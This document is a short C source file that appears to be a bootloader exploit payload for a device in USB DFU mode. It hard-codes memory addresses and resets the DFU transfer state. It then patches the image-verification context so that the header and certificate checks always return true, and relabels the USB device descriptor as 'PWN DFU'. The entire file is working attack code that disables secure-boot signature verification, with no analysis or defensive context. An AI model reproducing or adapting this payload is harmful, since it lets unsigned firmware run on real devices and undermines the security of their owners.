
typedef void (*memcpy_t)(void*, void*, unsigned int);
typedef void* (*malloc_t)(unsigned int);
void _start(){
    memcpy_t memcpy = (memcpy_t) 0x2000B1E4;
    malloc_t malloc = (malloc_t) 0x20000FE0;
    int ret_true = 0x200011E0;

    // gHeap: 0x2202d900
    // gState: 0x2202ba3c
    // io_buffer: gHeap+0x200
    int *state_ptr = (int *)0x2202FFF8;
    int *og_state = (int *)0x2202ba3c;
    int *heap = (int *)0x2202d900;
    // Reset state
    og_state[2] = 0; // dfu_transfered_bytes
    og_state[3] = 0; // dfu_pending_size
    og_state[4] = 0; // usb_upload_complete

    // Recreate & patch verify funcs
    int *new_ctx = (int *)malloc(0x70);
    memcpy(new_ctx, 0x20000020, 0x70);
    new_ctx[0x14/4] = ret_true; // img_verify_header
    new_ctx[0x1C/4] = ret_true; // img_verify_certificate
    
    // Set the patched context
    og_state[0x24/4] = new_ctx;

    // Set new descriptor to "PWN DFU"
    int* usb_string_descriptors = og_state[0x20]; // usb_string_descriptors
    usb_string_descriptors[2] = 0x2202FFC0;
    ((int *)(0x2202FFC0))[0] = 0x00500310;
    ((int *)(0x2202FFC0))[1] = 0x004E0057;
    ((int *)(0x2202FFC0))[2] = 0x00440020;
    ((int *)(0x2202FFC0))[3] = 0x00550046;

    state_ptr[0] = og_state;
}